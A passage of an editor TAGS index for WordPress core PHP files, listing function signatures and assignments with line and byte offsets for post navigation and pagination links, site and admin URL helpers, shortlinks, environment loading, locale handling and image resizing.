function adjacent_posts_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {in_same_cat1210,36180
	echo get_adjacent_post_rel_link($title, $in_same_cat, $excluded_categories = '', true);excluded_categories1211,36283
	echo get_adjacent_post_rel_link($title, $in_same_cat, $excluded_categories = '', false);excluded_categories1212,36372
function adjacent_posts_rel_link_wp_head() {adjacent_posts_rel_link_wp_head1222,36705
function next_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {next_post_rel_link1237,37182
function next_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {in_same_cat1237,37182
	echo get_adjacent_post_rel_link($title, $in_same_cat, $excluded_categories = '', false);excluded_categories1238,37280
function prev_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {prev_post_rel_link1250,37726
function prev_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {in_same_cat1250,37726
	echo get_adjacent_post_rel_link($title, $in_same_cat, $excluded_categories = '', true);excluded_categories1251,37824
function get_boundary_post( $in_same_cat = false, $excluded_categories = '', $start = true ) {get_boundary_post1267,38407
function get_boundary_post( $in_same_cat = false, $excluded_categories = '', $start = true ) {in_same_cat1267,38407
	$cat_array = array();cat_array1273,38591
		$excluded_categories = explode( ',', $excluded_categories );excluded_categories1275,38656
			$cat_array = wp_get_object_terms( $post->ID, 'category', array( 'fields' => 'ids' ) );cat_array1279,38800
			$excluded_categories = array_map( 'intval', $excluded_categories );excluded_categories1282,38934
			$excluded_categories = array_diff( $excluded_categories, $cat_array );excluded_categories1283,39005
			$inverse_cats = array();inverse_cats1285,39080
			$excluded_categories = $inverse_cats;excluded_categories1288,39213
	$categories = implode( ',', array_merge( $cat_array, $excluded_categories ) );categories1292,39262
	$order = $start ? 'ASC' : 'DESC';order1294,39343
function previous_post_link($format='&laquo; %link', $link='%title', $in_same_cat = false, $excluded_categories = '') {previous_post_link1309,39946
function previous_post_link($format='&laquo; %link', $link='%title', $in_same_cat = false, $excluded_categories = '') {link1309,39946
function next_post_link($format='%link &raquo;', $link='%title', $in_same_cat = false, $excluded_categories = '') {next_post_link1323,40544
function next_post_link($format='%link &raquo;', $link='%title', $in_same_cat = false, $excluded_categories = '') {link1323,40544
function adjacent_post_link($format, $link, $in_same_cat = false, $excluded_categories = '', $previous = true) {adjacent_post_link1340,41236
function adjacent_post_link($format, $link, $in_same_cat = false, $excluded_categories = '', $previous = true) {in_same_cat1340,41236
		$post = & get_post($GLOBALS['post']->post_parent);post1342,41386
		$post = get_adjacent_post($in_same_cat, $excluded_categories, $previous);post1344,41445
	$title = $post->post_title;title1349,41548
		$title = $previous ? __('Previous Post') : __('Next Post');title1352,41611
	$title = apply_filters('the_title', $title, $post->ID);title1354,41674
	$date = mysql2date(get_option('date_format'), $post->post_date);date1355,41731
	$rel = $previous ? 'prev' : 'next';rel1356,41797
	$string = '<a href="'.get_permalink($post).'" rel="'.$rel.'">';string1358,41835
	$link = str_replace('%title', $title, $link);link1359,41900
	$link = str_replace('%date', $date, $link);link1360,41947
	$link = $string . $link . '</a>';link1361,41992
	$format = str_replace('%link', $link, $format);format1363,42028
	$adjacent = $previous ? 'previous' : 'next';adjacent1365,42078
function get_pagenum_link($pagenum = 1, $escape = true ) {get_pagenum_link1379,42474
function get_pagenum_link($pagenum = 1, $escape = true ) {escape1379,42474
	$pagenum = (int) $pagenum;pagenum1382,42555
	$request = remove_query_arg( 'paged' );request1384,42584
	$home_root = parse_url(home_url());home_root1386,42626
	$home_root = ( isset($home_root['path']) ) ? $home_root['path'] : '';home_root1387,42663
	$home_root = preg_quote( trailingslashit( $home_root ), '|' );home_root1388,42734
	$request = preg_replace('|^'. $home_root . '|', '', $request);request1390,42799
	$request = preg_replace('|^/+|', '', $request);request1391,42863
		$base = trailingslashit( get_bloginfo( 'url' ) );base1394,42970
			$result = add_query_arg( 'paged', $pagenum, $base . $request );result1397,43047
			$result = $base . $request;result1399,43125
		$qs_regex = '|\?.*?$|';qs_regex1402,43170
			$query_string = $qs_match[0];query_string1406,43279
			$request = preg_replace( $qs_regex, '', $request );request1407,43312
			$query_string = '';query_string1409,43378
		$request = preg_replace( "|$wp_rewrite->pagination_base/\d+/?$|", '', $request);request1412,43406
		$request = preg_replace( '|^index\.php|', '', $request);request1413,43489
		$request = ltrim($request, '/');request1414,43548
		$base = trailingslashit( get_bloginfo( 'url' ) );base1416,43584
			$request = ( ( !empty( $request ) ) ? trailingslashit( $request ) : $request ) . user_trailingslashit( $wp_rewrite->pagination_base . "/" . $pagenum, 'paged' );request1422,43773
		$result = $base . $request . $query_string;result1425,43942
	$result = apply_filters('get_pagenum_link', $result);result1428,43992
function get_next_posts_page_link($max_page = 0) {get_next_posts_page_link1446,44302
			$paged = 1;paged1451,44410
		$nextpage = intval($paged) + 1;nextpage1452,44425
function next_posts( $max_page = 0, $echo = true ) {next_posts1466,44721
function next_posts( $max_page = 0, $echo = true ) {max_page1466,44721
	$output = esc_url( get_next_posts_page_link( $max_page ) );output1467,44774
function get_next_posts_link( $label = null, $max_page = 0 ) {get_next_posts_link1484,45074
function get_next_posts_link( $label = null, $max_page = 0 ) {label1484,45074
		$max_page = $wp_query->max_num_pages;max_page1488,45184
		$paged = 1;paged1491,45241
	$nextpage = intval($paged) + 1;nextpage1493,45256
		$label = __( 'Next Page &raquo;' );label1496,45314
		$attr = apply_filters( 'next_posts_link_attributes', '' );attr1499,45406
function next_posts_link( $label = null, $max_page = 0 ) {next_posts_link1513,45804
function next_posts_link( $label = null, $max_page = 0 ) {label1513,45804
function get_previous_posts_page_link() {get_previous_posts_page_link1528,46109
		$nextpage = intval($paged) - 1;nextpage1532,46191
			$nextpage = 1;nextpage1534,46248
function previous_posts( $echo = true ) {previous_posts1546,46440
function previous_posts( $echo = true ) {echo1546,46440
	$output = esc_url( get_previous_posts_page_link() );output1547,46482
function get_previous_posts_link( $label = null ) {get_previous_posts_link1563,46746
function get_previous_posts_link( $label = null ) {label1563,46746
		$label = __( '&laquo; Previous Page' );label1567,46839
		$attr = apply_filters( 'previous_posts_link_attributes', '' );attr1570,46919
function previous_posts_link( $label = null ) {previous_posts_link1583,47289
function previous_posts_link( $label = null ) {label1583,47289
function get_posts_nav_link( $args = array() ) {get_posts_nav_link1595,47564
function get_posts_nav_link( $args = array() ) {args1595,47564
	$return = '';return1598,47633
		$defaults = array(defaults1601,47674
		$args = wp_parse_args( $args, $defaults );args1606,47813
		$max_num_pages = $wp_query->max_num_pages;max_num_pages1608,47859
		$paged = get_query_var('paged');paged1609,47904
			$return = get_previous_posts_link($args['prelabel']);return1617,48101
function posts_nav_link( $sep = '', $prelabel = '', $nxtlabel = '' ) {posts_nav_link1635,48610
function posts_nav_link( $sep = '', $prelabel = '', $nxtlabel = '' ) {sep1635,48610
	$args = array_filter( compact('sep', 'prelabel', 'nxtlabel') );args1636,48681
function get_comments_pagenum_link( $pagenum = 1, $max_page = 0 ) {get_comments_pagenum_link1648,48915
function get_comments_pagenum_link( $pagenum = 1, $max_page = 0 ) {pagenum1648,48915
	$pagenum = (int) $pagenum;pagenum1651,49012
	$result = get_permalink( $post->ID );result1653,49041
				$result = user_trailingslashit( trailingslashit($result) . 'comment-page-' . $pagenum, 'commentpaged');result1658,49214
				$result = add_query_arg( 'cpage', $pagenum, $result );result1660,49330
			$result = user_trailingslashit( trailingslashit($result) . 'comment-page-' . $pagenum, 'commentpaged');result1664,49463
			$result = add_query_arg( 'cpage', $pagenum, $result );result1666,49577
	$result = apply_filters('get_comments_pagenum_link', $result);result1671,49665
function get_next_comments_link( $label = '', $max_page = 0 ) {get_next_comments_link1685,49944
function get_next_comments_link( $label = '', $max_page = 0 ) {label1685,49944
	$page = get_query_var('cpage');page1691,50094
	$nextpage = intval($page) + 1;nextpage1693,50128
		$max_page = $wp_query->max_num_comment_pages;max_page1696,50186
		$max_page = get_comment_pages_count();max_page1699,50260
		$label = __('Newer Comments &raquo;');label1705,50365
function next_comments_link( $label = '', $max_page = 0 ) {next_comments_link1718,50805
function next_comments_link( $label = '', $max_page = 0 ) {label1718,50805
function get_previous_comments_link( $label = '' ) {get_previous_comments_link1730,51079
function get_previous_comments_link( $label = '' ) {label1730,51079
	$page = get_query_var('cpage');page1734,51198
	$prevpage = intval($page) - 1;prevpage1739,51270
		$label = __('&laquo; Older Comments');label1742,51325
function previous_comments_link( $label = '' ) {previous_comments_link1754,51725
function previous_comments_link( $label = '' ) {label1754,51725
function paginate_comments_links($args = array()) {paginate_comments_links1767,52053
	$page = get_query_var('cpage');page1773,52193
		$page = 1;page1775,52241
	$max_page = get_comment_pages_count();max_page1776,52254
	$defaults = array(defaults1777,52294
	$args = wp_parse_args( $args, $defaults );args1788,52633
	$page_links = paginate_links( $args );page_links1789,52677
function get_shortcut_link() {get_shortcut_link1806,52932
	$link = "javascript:link1808,53019
			a=function(){if(!w.open(u,'t','toolbar=0,resizable=1,scrollbars=1,status=1,width=720,height=570'))l.href=u;};a1819,53327
	$link = str_replace(array("\r", "\n", "\t"),  '', $link);link1823,53526
function home_url( $path = '', $scheme = null ) {home_url1844,54174
function home_url( $path = '', $scheme = null ) {path1844,54174
function get_home_url( $blog_id = null, $path = '', $scheme = null ) {get_home_url1863,54850
function get_home_url( $blog_id = null, $path = '', $scheme = null ) {blog_id1863,54850
	$orig_scheme = $scheme;orig_scheme1864,54921
		$scheme = is_ssl() && !is_admin() ? 'https' : 'http';scheme1867,55014
		$url = get_option( 'home' );url1870,55116
		$url = get_blog_option( $blog_id, 'home' );url1872,55153
		$url = preg_replace( '#^.+://[^/]*#', '', $url );url1875,55230
		$url = str_replace( 'http://', "$scheme://", $url );url1877,55312
function site_url( $path = '', $scheme = null ) {site_url1901,56132
function site_url( $path = '', $scheme = null ) {path1901,56132
function get_site_url( $blog_id = null, $path = '', $scheme = null ) {get_site_url1920,56835
function get_site_url( $blog_id = null, $path = '', $scheme = null ) {blog_id1920,56835
	$orig_scheme = $scheme;orig_scheme1922,56970
			$scheme = 'https';scheme1925,57167
			$scheme = 'https';scheme1927,57246
			$scheme = 'https';scheme1929,57325
			$scheme = ( is_ssl() ? 'https' : 'http' );scheme1931,57354
		$url = get_option( 'siteurl' );url1935,57449
		$url = get_blog_option( $blog_id, 'siteurl' );url1937,57489
		$url = preg_replace( '#^.+://[^/]*#', '', $url );url1940,57569
		$url = str_replace( 'http://', "{$scheme}://", $url );url1942,57651
function admin_url( $path = '', $scheme = 'admin' ) {admin_url1960,58306
function admin_url( $path = '', $scheme = 'admin' ) {path1960,58306
function get_admin_url( $blog_id = null, $path = '', $scheme = 'admin' ) {get_admin_url1975,58874
function get_admin_url( $blog_id = null, $path = '', $scheme = 'admin' ) {blog_id1975,58874
	$url = get_site_url($blog_id, 'wp-admin/', $scheme);url1976,58949
function includes_url($path = '') {includes_url1993,59402
	$url = site_url() . '/' . WPINC . '/';url1994,59438
function content_url($path = '') {content_url2011,59867
	$url = WP_CONTENT_URL;url2012,59902
		$url = str_replace( 'http://', 'https://', $url );url2014,59973
function plugins_url($path = '', $plugin = '') {plugins_url2033,60686
function plugins_url($path = '', $plugin = '') {plugin2033,60686
	$mu_plugin_dir = WPMU_PLUGIN_DIR;mu_plugin_dir2035,60736
		$url = WPMU_PLUGIN_URL;url2042,61020
		$url = WP_PLUGIN_URL;url2044,61052
		$url = str_replace( 'http://', 'https://', $url );url2047,61124
		$folder = dirname(plugin_basename($plugin));folder2050,61226
function network_site_url( $path = '', $scheme = null ) {network_site_url2075,62048
function network_site_url( $path = '', $scheme = null ) {path2075,62048
	$orig_scheme = $scheme;orig_scheme2081,62190
			$scheme = 'https';scheme2084,62387
			$scheme = 'https';scheme2086,62468
			$scheme = 'https';scheme2088,62545
			$scheme = ( is_ssl() ? 'https' : 'http' );scheme2090,62574
		$url = $current_site->path;url2094,62654
		$url = $scheme . '://' . $current_site->domain . $current_site->path;url2096,62690
function network_home_url( $path = '', $scheme = null ) {network_home_url2118,63450
function network_home_url( $path = '', $scheme = null ) {path2118,63450
	$orig_scheme = $scheme;orig_scheme2124,63592
		$scheme = is_ssl() && !is_admin() ? 'https' : 'http';scheme2127,63685
		$url = $current_site->path;url2130,63772
		$url = $scheme . '://' . $current_site->domain . $current_site->path;url2132,63808
function network_admin_url( $path = '', $scheme = 'admin' ) {network_admin_url2150,64464
function network_admin_url( $path = '', $scheme = 'admin' ) {path2150,64464
	$url = network_site_url('wp-admin/network/', $scheme);url2154,64590
function user_admin_url( $path = '', $scheme = 'admin' ) {user_admin_url2172,65213
function user_admin_url( $path = '', $scheme = 'admin' ) {path2172,65213
	$url = network_site_url('wp-admin/user/', $scheme);url2173,65272
function self_admin_url($path = '', $scheme = 'admin') {self_admin_url2191,65932
function self_admin_url($path = '', $scheme = 'admin') {scheme2191,65932
function set_url_scheme( $url, $scheme = null ) {set_url_scheme2209,66467
function set_url_scheme( $url, $scheme = null ) {scheme2209,66467
	$orig_scheme = $scheme;orig_scheme2210,66517
			$scheme = 'https';scheme2213,66715
			$scheme = 'https';scheme2215,66794
			$scheme = 'https';scheme2217,66873
			$scheme = ( is_ssl() ? 'https' : 'http' );scheme2219,66902
		$url = preg_replace( '#^.+://[^/]*#', '', $url );url2223,66982
		$url = preg_replace( '#^.+://#', $scheme . '://', $url );url2225,67040
function get_dashboard_url( $user_id, $path = '', $scheme = 'admin' ) {get_dashboard_url2244,67893
function get_dashboard_url( $user_id, $path = '', $scheme = 'admin' ) {path2244,67893
	$user_id = (int) $user_id;user_id2245,67965
	$blogs = get_blogs_of_user( $user_id );blogs2247,67994
		$url = user_admin_url( $path, $scheme );url2249,68081
		$url = admin_url( $path, $scheme );url2251,68157
		$current_blog = get_current_blog_id();current_blog2253,68205
			$url = admin_url( $path, $scheme );url2255,68357
			$active = get_active_blog_for_user( $user_id );active2257,68407
				$url = get_admin_url( $active->blog_id, $path, $scheme );url2259,68476
				$url = user_admin_url( $path, $scheme );url2261,68546
function get_edit_profile_url( $user, $scheme = 'admin' ) {get_edit_profile_url2277,69013
function get_edit_profile_url( $user, $scheme = 'admin' ) {scheme2277,69013
	$user = (int) $user;user2278,69073
		$url = user_admin_url( 'profile.php', $scheme );url2281,69120
		$url = network_admin_url( 'profile.php', $scheme );url2283,69202
		$url = get_dashboard_url( $user, 'profile.php', $scheme );url2285,69262
function rel_canonical() {rel_canonical2296,69487
	$link = get_permalink( $id );link2304,69636
 * This function exists to provide a shortlink tag that all themes and plugins can target. A plugin must hook in toexists2311,69787
 * Plugins can short-circuit this function via the pre_get_shortlink filter or filter the outputvia2313,70014
function wp_get_shortlink($id = 0, $context = 'post', $allow_slugs = true) {wp_get_shortlink2323,70750
function wp_get_shortlink($id = 0, $context = 'post', $allow_slugs = true) {context2323,70750
	$shortlink = apply_filters('pre_get_shortlink', false, $id, $context, $allow_slugs);shortlink2325,70877
	$post_id = 0;post_id2330,71033
		$post_id = $wp_query->get_queried_object_id();post_id2332,71093
		$post = get_post($id);post2334,71177
		$post_id = $post->ID;post_id2335,71202
	$shortlink = '';shortlink2338,71230
		$post = get_post($post_id);post2342,71349
			$shortlink = home_url('?p=' . $post->ID);shortlink2344,71442
function wp_shortlink_wp_head() {wp_shortlink_wp_head2359,71755
	$shortlink = wp_get_shortlink( 0, 'query' );shortlink2360,71789
function wp_shortlink_header() {wp_shortlink_header2377,72127
	$shortlink = wp_get_shortlink(0, 'query');shortlink2381,72194
function the_shortlink( $text = '', $title = '', $before = '', $after = '' ) {the_shortlink2403,72862
function the_shortlink( $text = '', $title = '', $before = '', $after = '' ) {text2403,72862
		$text = __('This is the short link.');text2407,72980
		$title = the_title_attribute( array( 'echo' => false ) );title2410,73046
	$shortlink = wp_get_shortlink( $post->ID );shortlink2412,73107
		$link = '<a rel="shortlink" href="' . esc_url( $shortlink ) . '" title="' . $title . '">' . $text . '</a>';link2415,73184
		$link = apply_filters( 'the_shortlink', $link, $shortlink, $text, $title );link2416,73294

wordpress/wp-includes/load.php,5760
function wp_unregister_GLOBALS() {wp_unregister_GLOBALS17,297
	$no_unset = array( 'GLOBALS', '_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_ENV', '_FILES', 'table_prefix' );no_unset25,506
	$input = array_merge( $_GET, $_POST, $_COOKIE, $_SERVER, $_ENV, $_FILES, isset( $_SESSION ) && is_array( $_SESSION ) ? $_SESSION : array() );input27,625
	foreach ( $input as $k => $v )k28,768
function wp_fix_server_vars() {wp_fix_server_vars41,1012
	$default_server_values = array(default_server_values44,1064
	$_SERVER = array_merge( $default_server_values, $_SERVER );_SERVER49,1152
	$PHP_SELF = $_SERVER['PHP_SELF'];PHP_SELF90,2901
		$_SERVER['PHP_SELF'] = $PHP_SELF = preg_replace( '/(\?.*)?$/', '', $_SERVER["REQUEST_URI"] );PHP_SELF92,2963
function wp_check_php_mysql_versions() {wp_check_php_mysql_versions103,3234
	$php_version = phpversion();php_version105,3319
function wp_favicon_request() {wp_favicon_request123,4016
function wp_maintenance() {wp_maintenance145,4695
	$protocol = $_SERVER["SERVER_PROTOCOL"];protocol163,5152
		$protocol = 'HTTP/1.0';protocol165,5253
 * @global float $timestart Seconds from when function is called.is190,5893
function timer_start() {timer_start193,6000
	$timestart = microtime( true );timestart195,6045
 * Return and/or display the time from the page start to when function is called.is200,6099
 * $nTimePageTookToExecute = timer_stop();nTimePageTookToExecute204,6246
 * @global float $timeend Seconds from when function is calledis217,6633
function timer_stop( $display = 0, $precision = 3 ) { // if called like timer_stop(1), will echo $timetotaltimer_stop223,6962
function timer_stop( $display = 0, $precision = 3 ) { // if called like timer_stop(1), will echo $timetotaldisplay223,6962
	$timeend = microtime( true );timeend225,7100
	$timetotal = $timeend - $timestart;timetotal226,7131
	$r = ( function_exists( 'number_format_i18n' ) ) ? number_format_i18n( $timetotal, $precision ) : number_format( $timetotal, $precision );r227,7168
 * defined in wp-config.php. Example: <code> define( 'WP_DEBUG', true ); </code>WP_DEBUG237,7507
 * WP_DEBUG_DISPLAY and WP_DEBUG_LOG perform no function unless WP_DEBUG is true.unless239,7591
 * notices, including one when a deprecated WordPress function, function argument,argument243,7791
function wp_debug_mode() {wp_debug_mode260,8501
function wp_set_lang_dir() {wp_set_lang_dir298,9748
			define( 'WP_LANG_DIR', WP_CONTENT_DIR . '/languages' ); // no leading slash, no trailing slash, full path, not relative to ABSPATHWP_LANG_DIR301,9957
				define( 'LANGDIR', 'wp-content/languages' );LANGDIR304,10231
			define( 'WP_LANG_DIR', ABSPATH . WPINC . '/languages' ); // no leading slash, no trailing slash, full path, not relative to ABSPATHWP_LANG_DIR307,10296
				define( 'LANGDIR', WPINC . '/languages' );LANGDIR310,10529
 * Load the correct database class file.file317,10595
 * This function is used to load the database class file either at runtime or byfile319,10639
 * This function is used to load the database class file either at runtime or byis319,10639
function require_wp_db() {require_wp_db326,10914
	$wpdb = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );wpdb336,11137
function wp_set_wpdb_vars() {wp_set_wpdb_vars353,11519
	$prefix = $wpdb->set_prefix( $table_prefix );prefix366,12385
function wp_start_object_cache() {wp_start_object_cache383,12865
	$first_init = false;first_init386,12938
			$_wp_using_ext_object_cache = true;_wp_using_ext_object_cache390,13129
			$_wp_using_ext_object_cache = false;_wp_using_ext_object_cache393,13231
		$first_init = true;first_init395,13275
		$_wp_using_ext_object_cache = true;_wp_using_ext_object_cache400,13649
function wp_not_installed() {wp_not_installed425,14489
		$link = wp_guess_url() . '/wp-admin/install.php';link431,14854
function wp_get_mu_plugins() {wp_get_mu_plugins452,15432
	$mu_plugins = array();mu_plugins453,15463
	if ( ! $dh = opendir( WPMU_PLUGIN_DIR ) )dh456,15544
	while ( ( $plugin = readdir( $dh ) ) !== false ) {plugin458,15609
function wp_get_active_and_valid_plugins() {wp_get_active_and_valid_plugins479,16149
	$plugins = array();plugins480,16194
	$active_plugins = (array) get_option( 'active_plugins', array() );active_plugins481,16215
	$network_plugins = is_multisite() ? wp_get_active_network_plugins() : false;network_plugins492,16600
function wp_set_internal_encoding() {wp_set_internal_encoding515,17391
function wp_magic_quotes() {wp_magic_quotes531,17825
		$_GET    = stripslashes_deep( $_GET    );_GET534,17918
		$_POST   = stripslashes_deep( $_POST   );_POST535,17962
		$_COOKIE = stripslashes_deep( $_COOKIE );_COOKIE536,18006
	$_GET    = add_magic_quotes( $_GET    );_GET540,18076
	$_POST   = add_magic_quotes( $_POST   );_POST541,18118
	$_COOKIE = add_magic_quotes( $_COOKIE );_COOKIE542,18160
	$_SERVER = add_magic_quotes( $_SERVER );_SERVER543,18202
	$_REQUEST = array_merge( $_GET, $_POST );_REQUEST546,18281
function shutdown_action_hook() {shutdown_action_hook555,18419
function wp_clone( $object ) {wp_clone570,18651
function is_admin() {is_admin585,19067
function is_blog_admin() {is_blog_admin601,19468
function is_network_admin() {is_network_admin617,19898
function is_user_admin() {is_user_admin633,20321
function is_multisite() {is_multisite646,20558
function wp_load_translations_early() {wp_load_translations_early668,21163
	static $loaded = false;loaded671,21241
	static $loaded = false;loaded671,21241
	$loaded = true;loaded674,21292
	$locales = $locations = array();locales690,21703
		$locations = array_unique( $locations );locations720,22417
	$wp_locale = new WP_Locale();wp_locale736,22889

wordpress/wp-includes/locale.php,1397
class WP_Locale {WP_Locale14,159
	var $weekday;weekday22,305
	var $weekday_initial;weekday_initial36,661
	var $weekday_abbrev;weekday_abbrev45,820
	var $month;month54,969
	var $month_abbrev;month_abbrev63,1116
	var $meridiem;meridiem74,1295
	var $text_direction = 'ltr';text_direction85,1466
	var $text_direction = 'ltr';text_direction85,1466
	function init() {init97,1776
		foreach ($this->weekday_initial as $weekday_ => $weekday_initial_) {weekday_117,3272
		foreach ($this->month_abbrev as $month_ => $month_abbrev_) {month_159,6731
		$trans = __('number_format_thousands_sep');trans173,7209
		$trans = __('number_format_decimal_point');trans177,7444
			$this->text_direction = $GLOBALS['text_direction'];text_direction182,7661
			$this->text_direction = 'rtl';text_direction185,7849
	function get_weekday($weekday_number) {get_weekday201,8269
	function get_weekday_initial($weekday_name) {get_weekday_initial219,8704
	function get_weekday_abbrev($weekday_name) {get_weekday_abbrev235,9106
	function get_month($month_number) {get_month256,9697
	function get_month_abbrev($month_name) {get_month_abbrev272,10135
	function get_meridiem($meridiem) {get_meridiem287,10520
	function register_globals() {register_globals299,10773
	function __construct() {__construct316,11261
	function is_rtl() {is_rtl327,11445
function is_rtl() {is_rtl338,11615

wordpress/wp-includes/media.php,22398
 * @uses wp_constrain_dimensions() This function passes the widths and the heights.passes27,975
function image_constrain_size_for_editor($width, $height, $size = 'medium') {image_constrain_size_for_editor34,1295
function image_constrain_size_for_editor($width, $height, $size = 'medium') {size34,1295
		$max_width = $size[0];max_width38,1453
		$max_height = $size[1];max_height39,1478
	elseif ( $size == 'thumb' || $size == 'thumbnail' ) {size41,1507
		$max_width = intval(get_option('thumbnail_size_w'));max_width42,1562
		$max_height = intval(get_option('thumbnail_size_h'));max_height43,1617
			$max_width = 128;max_width46,1753
			$max_height = 96;max_height47,1774
	elseif ( $size == 'medium' ) {size50,1802
		$max_width = intval(get_option('medium_size_w'));max_width51,1834
		$max_height = intval(get_option('medium_size_h'));max_height52,1886
	elseif ( $size == 'large' ) {size55,2015
		$max_width = intval(get_option('large_size_w'));max_width60,2312
		$max_height = intval(get_option('large_size_h'));max_height61,2363
			$max_width = min( intval($content_width), $max_width );max_width63,2451
		$max_width = intval( $_wp_additional_image_sizes[$size]['width'] );max_width65,2667
		$max_height = intval( $_wp_additional_image_sizes[$size]['height'] );max_height66,2737
			$max_width = min( intval($content_width), $max_width );max_width68,2928
	// $size == 'full' has no constraintsize70,2990
		$max_width = $width;max_width72,3036
		$max_height = $height;max_height73,3059
function image_hwstring($width, $height) {image_hwstring98,3958
	$out = '';out99,4001
 * function won't create a new resized copy, it will just return an alreadywon115,4516
function image_downsize($id, $size = 'medium') {image_downsize131,5218
function image_downsize($id, $size = 'medium') {size131,5218
	$img_url = wp_get_attachment_url($id);img_url136,5322
	$meta = wp_get_attachment_metadata($id);meta137,5362
	$width = $height = 0;width138,5404
	$is_intermediate = false;is_intermediate139,5427
	$img_url_basename = wp_basename($img_url);img_url_basename140,5454
	if ( $out = apply_filters('image_downsize', false, $id, $size) )out143,5551
	if ( $intermediate = image_get_intermediate_size($id, $size) ) {intermediate147,5675
		$img_url = str_replace($img_url_basename, $intermediate['file'], $img_url);img_url148,5741
		$width = $intermediate['width'];width149,5819
		$height = $intermediate['height'];height150,5854
		$is_intermediate = true;is_intermediate151,5891
	elseif ( $size == 'thumbnail' ) {size153,5921
		if ( ($thumb_file = wp_get_attachment_thumb_file($id)) && $info = getimagesize($thumb_file) ) {info155,5992
			$img_url = str_replace($img_url_basename, wp_basename($thumb_file), $img_url);img_url156,6090
			$width = $info[0];width157,6172
			$height = $info[1];height158,6194
			$is_intermediate = true;is_intermediate159,6217
		$width = $meta['width'];width164,6364
		$height = $meta['height'];height165,6391
function add_image_size( $name, $width = 0, $height = 0, $crop = false ) {add_image_size183,6776
function add_image_size( $name, $width = 0, $height = 0, $crop = false ) {width183,6776
function set_post_thumbnail_size( $width = 0, $height = 0, $crop = false ) {set_post_thumbnail_size193,7099
function set_post_thumbnail_size( $width = 0, $height = 0, $crop = false ) {width193,7099
 * The filter 'get_image_tag_class' allows for changing the class name for thename200,7324
 *		class attribute.attribute212,7883
 * @param string $align Part of the class name for aligning the image.name219,8171
function get_image_tag($id, $alt, $title, $align, $size='medium') {get_image_tag223,8362
function get_image_tag($id, $alt, $title, $align, $size='medium') {size223,8362
	$hwstring = image_hwstring($width, $height);hwstring226,8496
	$class = 'align' . esc_attr($align) .' size-' . esc_attr($size) . ' wp-image-' . $id;class228,8543
	$class = apply_filters('get_image_tag_class', $class, $id, $align, $size);class229,8630
	$html = '<img src="' . esc_attr($img_src) . '" alt="' . esc_attr($alt) . '" title="' . esc_attr($title).'" '.$hwstring.'class="'.$class.'" />';html231,8707
	$html = apply_filters( 'get_image_tag', $html, $id, $alt, $title, $align, $size );html233,8853
function wp_load_image( $file ) {wp_load_image246,9178
		$file = get_attached_file( $file );file248,9240
	$image = imagecreatefromstring( file_get_contents( $file ) );image258,9654
function wp_constrain_dimensions( $current_width, $current_height, $max_width=0, $max_height=0 ) {wp_constrain_dimensions280,10323
function wp_constrain_dimensions( $current_width, $current_height, $max_width=0, $max_height=0 ) {max_width280,10323
	$width_ratio = $height_ratio = 1.0;width_ratio284,10511
	$did_width = $did_height = false;did_width285,10548
		$width_ratio = $max_width / $current_width;width_ratio288,10662
		$did_width = true;did_width289,10708
		$height_ratio = $max_height / $current_height;height_ratio293,10815
		$did_height = true;did_height294,10864
	$smaller_ratio = min( $width_ratio, $height_ratio );smaller_ratio298,10930
	$larger_ratio  = max( $width_ratio, $height_ratio );larger_ratio299,10984
		$ratio = $smaller_ratio;ratio303,11227
		$ratio = $larger_ratio;ratio306,11327
	$w = intval( $current_width  * $ratio );w308,11354
	$h = intval( $current_height * $ratio );h309,11396
	if ( $did_width && $w == $max_width - 1 )w314,11811
		$w = $max_width; // Round it upw315,11854
	if ( $did_height && $h == $max_height - 1 )h316,11888
		$h = $max_height; // Round it uph317,11933
function image_resize_dimensions($orig_w, $orig_h, $dest_w, $dest_h, $crop = false) {image_resize_dimensions340,12825
function image_resize_dimensions($orig_w, $orig_h, $dest_w, $dest_h, $crop = false) {crop340,12825
	$output = apply_filters( 'image_resize_dimensions', null, $orig_w, $orig_h, $dest_w, $dest_h, $crop );output349,13130
		$aspect_ratio = $orig_w / $orig_h;aspect_ratio355,13393
		$new_w = min($dest_w, $orig_w);new_w356,13430
		$new_h = min($dest_h, $orig_h);new_h357,13464
			$new_w = intval($new_h * $aspect_ratio);new_w360,13518
			$new_h = intval($new_w / $aspect_ratio);new_h364,13586
		$size_ratio = max($new_w / $orig_w, $new_h / $orig_h);size_ratio367,13635
		$crop_w = round($new_w / $size_ratio);crop_w369,13693
		$crop_h = round($new_h / $size_ratio);crop_h370,13734
		$s_x = floor( ($orig_w - $crop_w) / 2 );s_x372,13776
		$s_y = floor( ($orig_h - $crop_h) / 2 );s_y373,13819
		$crop_w = $orig_w;crop_w376,13951
		$crop_h = $orig_h;crop_h377,13972
		$s_x = 0;s_x379,13994
		$s_y = 0;s_y380,14006
function image_resize( $file, $max_w, $max_h, $crop = false, $suffix = null, $dest_path = null, $jpeg_quality = 90 ) {image_resize417,15543
function image_resize( $file, $max_w, $max_h, $crop = false, $suffix = null, $dest_path = null, $jpeg_quality = 90 ) {crop417,15543
	$image = wp_load_image( $file );image419,15663
	$size = @getimagesize( $file );size423,15792
	$dims = image_resize_dimensions($orig_w, $orig_h, $max_w, $max_h, $crop);dims428,15966
	$newimage = wp_imagecreatetruecolor( $dst_w, $dst_h );newimage433,16241
		$suffix = "{$dst_w}x{$dst_h}";suffix446,16827
	$info = pathinfo($file);info448,16861
	$dir = $info['dirname'];dir449,16887
	$ext = $info['extension'];ext450,16913
	$name = wp_basename($file, ".$ext");name451,16941
	if ( !is_null($dest_path) and $_dest_path = realpath($dest_path) )_dest_path453,16980
		$dir = $_dest_path;dir454,17048
	$destfilename = "{$dir}/{$name}-{$suffix}.{$ext}";destfilename455,17070
			$destfilename = "{$dir}/{$name}-{$suffix}.jpg";destfilename466,17546
	$stat = stat( dirname( $destfilename ));stat474,17851
	$perms = $stat['mode'] & 0000666; //same permissions as parent folder, strip off the executable bitsperms475,17893
function image_make_intermediate_size($file, $width, $height, $crop=false) {image_make_intermediate_size496,18685
function image_make_intermediate_size($file, $width, $height, $crop=false) {crop496,18685
		$resized_file = image_resize($file, $width, $height, $crop);resized_file498,18790
